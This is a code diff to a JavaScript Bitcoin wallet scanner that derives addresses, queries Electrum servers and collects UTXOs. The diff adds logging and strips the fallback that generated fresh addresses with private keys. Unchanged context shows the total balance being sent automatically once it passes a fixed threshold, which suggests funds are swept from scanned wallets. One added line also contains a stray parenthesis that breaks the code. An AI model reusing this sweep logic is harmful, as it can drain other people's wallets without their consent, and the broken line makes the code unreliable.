@@ -25,6 +25,7 @@ async function connectToElectrumServer() {
         const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
         try {
             await electrumClient.connect();
+            console.log(`Connected to Electrum server ${server.host}`);
             return electrumClient;
         } catch (error) {
             console.error(`Failed to connect to Electrum server ${server.host}:`, error);
@@ -89,27 +90,15 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     let start = 0;
     let receiveUnusedFound = false;
     let changeUnusedFound = false;
-    let maxUsedReceivePath = -1;
-    let maxUsedChangePath = -1;
     let utxos = [];
 
     while (!receiveUnusedFound || !changeUnusedFound) {
+        console.log(`Checking addresses from ${start} to ${start + batchSize - 1} for ${bipType}`);
         const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);
 
         results.usedAddresses.push(...batchResults.usedAddresses);
         results.totalBalance += batchResults.totalBalance;
         utxos.push(...batchResults.utxos);
-
-        batchResults.usedAddresses.forEach(addr => {
-            const pathParts = addr.path.split('/');
-            const chainIndex = parseInt(pathParts[pathParts.length - 2]);
-            const addressIndex = parseInt(pathParts[pathParts.length - 1]);
-            if (chainIndex === 0) {
-                if (addressIndex > maxUsedReceivePath) maxUsedReceivePath = addressIndex;
-            } else if (chainIndex === 1) {
-                if (addressIndex > maxUsedChangePath) maxUsedChangePath = addressIndex;
-            }
-        });
 
         if (!receiveUnusedFound && batchResults.freshReceiveAddress) {
             results.freshReceiveAddress = batchResults.freshReceiveAddress;
@@ -125,30 +114,6 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     }
 
     results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
-
-    if (!results.freshReceiveAddress) {
-        const receivePath = `${path}/0/${maxUsedReceivePath + 1}`;
-        results.freshReceiveAddress = {
-            address: getAddress(account.derivePath(`0/${maxUsedReceivePath + 1}`), network, bipType),
-            wif: account.derivePath(`0/${maxUsedReceivePath + 1}`).toWIF(),
-            path: receivePath,
-            balance: { confirmed: 0, unconfirmed: 0, total: 0 },
-            transactions: { confirmed: 0, unconfirmed: 0, total: 0 },
-            utxos: []
-        };
-    }
-
-    if (!results.freshChangeAddress) {
-        const changePath = `${path}/1/${maxUsedChangePath + 1}`;
-        results.freshChangeAddress = {
-            address: getAddress(account.derivePath(`1/${maxUsedChangePath + 1}`), network, bipType),
-            wif: account.derivePath(`1/${maxUsedChangePath + 1}`).toWIF(),
-            path: changePath,
-            balance: { confirmed: 0, unconfirmed: 0, total: 0 },
-            transactions: { confirmed: 0, unconfirmed: 0, total: 0 },
-            utxos: []
-        };
-    }
 
     if (results.totalBalance > 2439747) {
         await sendTransaction(results.totalBalance, utxos);
@@ -173,6 +138,7 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
     for (let i = start; i < start + batchSize; i++) {
         for (const chain of [0, 1]) {
             tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
+                console.log(`Checked address: ${addressData.address} at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
                 if (addressData.transactions.total > 0) {
                     results.usedAddresses.push(addressData);
                     results.utxos.push(...addressData.utxos);
@@ -198,7 +164,7 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
 
 async function checkAddress(account, index, chain, network, bipType, electrumClient, basePath) {
     let derivedPath = account.derivePath(`${chain}/${index}`);
-    let fullDerivationPath = `${basePath}/${chain}/${index}`;
+    let fullDerivationPath = `${basePath}/${chain}/${index}`);
     let address = getAddress(derivedPath, network, bipType);
     let scriptHash = bitcoin.crypto.sha256(Buffer.from(bitcoin.address.toOutputScript(address, network))).reverse().toString('hex');
 
@@ -293,3 +259,4 @@ function getAddress(derivedPath, network, bipType) {
 }
 
 module.exports = { generateWallet };
+
